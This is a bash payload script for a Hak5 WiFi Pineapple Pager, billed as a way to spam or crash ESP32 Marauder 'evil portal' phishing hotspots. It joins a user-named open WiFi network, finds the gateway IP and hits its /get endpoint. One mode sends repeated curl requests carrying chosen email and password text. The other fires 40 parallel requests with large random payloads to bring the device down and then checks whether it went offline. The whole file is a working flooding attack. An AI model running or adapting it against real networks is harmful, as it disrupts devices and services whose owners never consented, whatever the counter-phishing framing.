#!/bin/bash
# github.com/OSINTI4L
# Portal Pwn is a payload for crashing/spamming ESP32 Marauder evil portals with a Hak5 WiFi Pineapple Pager. It works be throwing random data via cURL requests at the evil portal, overwhelming it, and crashing it.

# Disconnect wlan0cli if connected:
LOG blue "Checking if wlan0cli is currently connected.."
sleep 1.5
wlan0CHK=$(ip r | grep -i wlan0cli)
if [ -n "$wlan0CHK" ]; then
    LOG red "wlan0cli currently connected, disconnecting.."
    WIFI_DISCONNECT wlan0cli
    LOG green "Complete!"
    sleep 1.5
fi

LOG green "wlan0cli ready to connect!"
sleep 1.5

# Enter target EP:
EPSSID="$(TEXT_PICKER 'Enter evil portal SSID' '')"
    LOG blue "Target network: $EPSSID"
sleep 1.5

# Connect to target EP:
spinner1=$(START_SPINNER "Connecting to $EPSSID")
    WIFI_CONNECT wlan0cli "$EPSSID" open "NONE" ANY
    NETCHK="false"
    for i in {1..12}; do
        EPUP=$(ip r | grep -i wlan0cli)
        if [ -n "$EPUP" ]; then
            NETCHK="true"
            break
        else
            sleep 10
        fi
    done
STOP_SPINNER "${spinner1}"

if [ "$NETCHK" != "true" ]; then
    ALERT "Unable to connect to $EPSSID!"
    LOG red "Exiting."
    exit 0
fi

LOG green "Connected to $EPSSID!"

sleep 1.5

# Get EP IP:
spinner2=$(START_SPINNER "Getting IP address")
    IPCHK="false"
    for ip in {1..12}; do
        EPIP=$(ip r | grep -i wlan0cli | grep -i default | awk '{print $3}')
        if [ -n "$EPIP" ]; then
            IPCHK="true"
            break
        else
            sleep 10
        fi
    done
STOP_SPINNER "${spinner2}"

if [ "$IPCHK" != "true" ]; then
    ALERT "$EPSSID IP address could not be found!"
    LOG red "Disconnecting from $EPSSID and exiting."
    WIFI_DISCONNECT wlan0cli
    exit 0
fi

LOG green "$EPSSID IP address: $EPIP"
sleep 1.5

# Select attack mode and send payload:
AMODE="$(TEXT_PICKER 'Choose attack mode' 'Spam: 1 Crash: 2')"
    LOG blue "Attack mode: $AMODE selected."
    sleep 1.5

if [ "$AMODE" -eq "1" ]; then
    EMAILPAYLOAD="$(TEXT_PICKER 'Enter text to spam' 'Payload for email field')"
    sleep 1
    PASSPAYLOAD="$(TEXT_PICKER 'Enter text to spam' 'Payload for passw field')"
    sleep 1
    REQNUM="$(TEXT_PICKER 'Enter number of requests' '')"
    sleep 1
    LOG blue "Email field payload to be spammed: $EMAILPAYLOAD"
    LOG blue "Password field payload to be spammed: $PASSPAYLOAD"
    LOG blue "Number of requests to send: $REQNUM"
    sleep 2.5
    LOG blue "Sending payload.."
    sleep 1
    for spam in $(seq 1 "$REQNUM"); do
        curl -s -o /dev/null --get \
        --data-urlencode "email=${EMAILPAYLOAD}" \
        --data-urlencode "password=${PASSPAYLOAD}" \
        "http://${EPIP}/get"
        sleep 1
    done
    LOG green "Payload sent!"
    sleep 1.5
    LOG blue "Disconnecting from $EPSSID.."
    WIFI_DISCONNECT wlan0cli
    LOG green "Complete, exiting."
    exit 0
elif [ "$AMODE" -eq "2" ]; then
    PAYLOAD=$(head -c 3000 /dev/urandom | base64 | tr -d '+/=' | tr -d '\n')
    LOG blue "Sending payload.."
    sleep 1.5
    for i in {1..40}; do
        curl -s -o /dev/null "http://${EPIP}/get?email=${PAYLOAD}&password=${PAYLOAD}" &
    done
    LOG green "Payload sent!"
    sleep 1.5
    LOG blue "Checking status of $EPSSID.."
        ISUP="true"
        for check in {1..10}; do
            EPIP=$(ip r | grep -i wlan0cli | grep -i default | awk '{print $3}')
            if [ -z "$EPIP" ]; then
                LOG green "$EPSSID successfully crashed!"
                sleep 1.5
                LOG blue "Cleaning background curl processes.."
                killall curl
                LOG blue "Disconnecting from $EPSSID.."
                WIFI_DISCONNECT wlan0cli
                LOG green "Complete, exiting."
                exit 0
            else
                sleep 3
            fi
        done
else
    ALERT "Invalid attack mode!"
    LOG red "Disconnecting from $EPSSID and exiting."
    WIFI_DISCONNECT wlan0cli
    exit 0
fi

if [ "$ISUP" = "true" ]; then
    ALERT "Attack unsuccessful!"
    LOG blue "Cleaning background curl processes.."
    killall curl
    LOG blue "Disconnecting from $EPSSID.."
    WIFI_DISCONNECT wlan0cli
    LOG green "Complete, exiting."
    exit 0
fi
